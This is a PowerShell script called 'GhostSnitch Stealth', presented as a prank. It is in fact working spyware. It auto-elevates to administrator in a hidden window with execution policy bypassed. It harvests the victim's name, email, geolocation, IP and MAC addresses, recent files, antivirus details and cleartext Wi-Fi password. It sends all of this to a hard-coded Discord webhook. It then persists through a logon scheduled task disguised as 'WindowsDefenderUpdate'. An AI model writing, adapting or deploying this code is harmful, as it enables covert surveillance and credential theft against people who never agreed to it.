####################################################################################################
# Title       : GhostSnitch Stealth
# Version     : 1.4
# Author      : I am TBJr
# Description : Curiosity was the spark, but roasting you is the flame. Admin-elevated delivery.
####################################################################################################

# --- Configuration -----------------------------------------------------------
$webhookUrl  = 'https://discord.com/api/webhooks/1504979465015394407/vfGz6lp8QwdKt_6z_4AIcKefhRoCueEUh8gb3IioAwIzCJ9LB9WP2aC-HLKJ3c_2vabw'   # Discord webhook (#ghostsnitch-reports) — from DISCORD_WEBHOOK_GHOSTSNITCH in .env
$prankId     = [System.Guid]::NewGuid().ToString('N').Substring(0,8).ToUpper()
$targetAlias = $env:COMPUTERNAME
# -----------------------------------------------------------------------------

# Auto-elevate to Administrator if not already running elevated.
# When launched via irm|iex there is no $PSCommandPath, so we write the script
# content to a temp file and elevate that file instead.
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $tempScript = "$env:TEMP\gs_stealth_runner.ps1"
    if ($MyInvocation.MyCommand.Path) {
        Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $tempScript -Force
    } else {
        $MyInvocation.MyCommand.ScriptBlock.ToString() | Out-File -FilePath $tempScript -Encoding UTF8 -Force
    }
    Start-Process powershell -Verb runAs `
        -ArgumentList "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$tempScript`""
    exit
}

function Get-FullName {
    try {
        $n = (net user $env:username 2>$null | Select-String "Full Name").ToString().Split(":")[1].Trim()
        if ([string]::IsNullOrWhiteSpace($n)) { $n = $env:username }
        return $n
    } catch { return $env:username }
}

function Get-GeoInfo {
    try {
        $r = (Invoke-WebRequest 'https://ipwho.is/' -UseBasicParsing -TimeoutSec 5).Content | ConvertFrom-Json
        return "$($r.city), $($r.region), $($r.country)  |  ISP: $($r.connection.isp)"
    } catch { return "Geolocation unavailable" }
}

function Get-UserInfo   { "User: $env:USERNAME on $env:COMPUTERNAME" }

function Get-Email {
    try {
        $email = (gpresult /z 2>$null | Select-String -Pattern "\b\S+@\S+\.\S+\b").Matches.Value | Select-Object -First 1
        if (-not $email) { return "No email found" }
        return "Email: $email"
    } catch { return "Email not found" }
}

function Get-OS         { (Get-CimInstance Win32_OperatingSystem).Caption }

function Get-Uptime {
    $boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $up   = New-TimeSpan -Start $boot -End (Get-Date)
    return "$($up.Days) days, $($up.Hours) hrs"
}

function Get-DriveStats {
    (Get-PSDrive -PSProvider FileSystem | ForEach-Object {
        "$($_.Name): $([int]($_.Used/1GB))GB used / $([int]($_.Free/1GB))GB free"
    }) -join "`n"
}

function Get-RecentFiles {
    (Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
        Sort-Object LastWriteTime -Descending | Select-Object -First 5 |
        ForEach-Object { $_.Name }) -join ", "
}

function Get-USB {
    try { (Get-PnpDevice -Class 'USB' -ErrorAction Stop).FriendlyName -join ", " }
    catch { "No USB info found" }
}

function Get-BitLocker {
    try {
        (Get-BitLockerVolume -ErrorAction Stop | ForEach-Object {
            "$($_.MountPoint): $($_.ProtectionStatus)"
        }) -join ", "
    } catch { "BitLocker status unknown" }
}

function Get-NetworkInfo {
    $ip  = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -notlike '169.*' -and $_.IPAddress -ne '127.0.0.1' } |
            Select-Object -First 1).IPAddress
    $mac = (Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).MacAddress
    "Local IP: $ip, MAC: $mac"
}

function Get-Antivirus {
    try { (Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntivirusProduct -ErrorAction Stop).displayName -join ", " }
    catch { "No antivirus info" }
}

function Get-TopProcesses {
    (Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5 |
        ForEach-Object { "$($_.ProcessName): $([math]::Round($_.WorkingSet/1MB,1))MB" }) -join ", "
}

function Get-RAM {
    try {
        $RAM = [int]((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB)
        if ($RAM -lt 4)  { return "$RAM GB? Powered by hopes and prayers." }
        if ($RAM -lt 8)  { return "$RAM GB? Barely enough to load your regrets." }
        if ($RAM -lt 16) { return "$RAM GB? Gamer vibes. With lag." }
        return "$RAM GB? Respect. But no firewall? Lol."
    } catch { "RAM detection failed." }
}

function Get-PubIP {
    try { (Invoke-WebRequest 'https://ipinfo.io/ip' -UseBasicParsing -TimeoutSec 5).Content.Trim() }
    catch { "No public IP" }
}

function Get-WifiPass {
    try {
        $ssid = (netsh wlan show interface 2>$null | Select-String '^\s+SSID\s+:').ToString().Split(":")[1].Trim()
        if ([string]::IsNullOrEmpty($ssid)) { return "Not connected to WiFi." }
        # Running as admin at this point, so key extraction should succeed
        $pass = (netsh wlan show profile name="$ssid" key=clear 2>$null | Select-String 'Key Content').ToString().Split(":")[1].Trim()
        "$ssid password: $pass"
    } catch { "No WiFi pass found" }
}

function Get-PasswordAge {
    try {
        $line = (net user $env:UserName 2>$null | Select-String "Password last set").ToString()
        $days = (New-TimeSpan -Start ([datetime]$line.Split(':')[1].Trim()) -End (Get-Date)).Days
        "$days days since last password set"
    } catch { "Password age unknown" }
}

# ---- Collect all data once --------------------------------------------------
$fullName   = Get-FullName
$userInfo   = Get-UserInfo
$emailInfo  = Get-Email
$osInfo     = Get-OS
$uptime     = Get-Uptime
$drives     = Get-DriveStats
$recent     = Get-RecentFiles
$usb        = Get-USB
$bitlocker  = Get-BitLocker
$network    = Get-NetworkInfo
$av         = Get-Antivirus
$procs      = Get-TopProcesses
$ramRoast   = Get-RAM
$pubIP      = Get-PubIP
$wifiRoast  = Get-WifiPass
$passAge    = Get-PasswordAge
$geo        = Get-GeoInfo

# ---- Send report to Discord -------------------------------------------------
if ($webhookUrl -ne 'REPLACE_ME') {
    $payload = @{
        username = "GhostSnitch (Stealth)"
        content  = "Stealth log received | ID: ``$prankId``"
        embeds   = @(@{
            title  = "GhostSnitch Report for $fullName"
            color  = 65280
            fields = @(
                @{ name = "Prank ID";      value = $prankId;    inline = $true  },
                @{ name = "Target";        value = $targetAlias; inline = $true  },
                @{ name = "Location";      value = $geo;        inline = $false },
                @{ name = "User Info";     value = $userInfo;  inline = $true  },
                @{ name = "Email";         value = $emailInfo; inline = $false },
                @{ name = "OS";            value = $osInfo;    inline = $true  },
                @{ name = "Uptime";        value = $uptime;    inline = $true  },
                @{ name = "Drives";        value = $drives;    inline = $false },
                @{ name = "Recent Files";  value = $recent;    inline = $false },
                @{ name = "USB Devices";   value = $usb;       inline = $false },
                @{ name = "BitLocker";     value = $bitlocker; inline = $true  },
                @{ name = "Network";       value = $network;   inline = $true  },
                @{ name = "Antivirus";     value = $av;        inline = $false },
                @{ name = "Top Processes"; value = $procs;     inline = $false },
                @{ name = "RAM";           value = $ramRoast;  inline = $true  },
                @{ name = "Public IP";     value = $pubIP;     inline = $true  },
                @{ name = "WiFi Password"; value = $wifiRoast; inline = $false },
                @{ name = "Password Age";  value = $passAge;   inline = $false }
            )
            timestamp = (Get-Date).ToString("o")
        })
    }
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post `
            -Body (ConvertTo-Json $payload -Depth 10) `
            -ContentType 'application/json' -ErrorAction Stop
    } catch {}
}

# ---- Persist ----------------------------------------------------------------
$dest = "$env:APPDATA\Microsoft\ghostsnitch_s.ps1"
if ($MyInvocation.MyCommand.Path) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $dest -Force -ErrorAction SilentlyContinue
} else {
    $MyInvocation.MyCommand.ScriptBlock.ToString() | Out-File -FilePath $dest -Encoding UTF8 -Force
}
schtasks /create /f /sc onlogon /tn "WindowsDefenderUpdate" `
    /tr "powershell -w h -NoP -NonI -Ep Bypass -File `"$dest`"" 2>$null | Out-Null
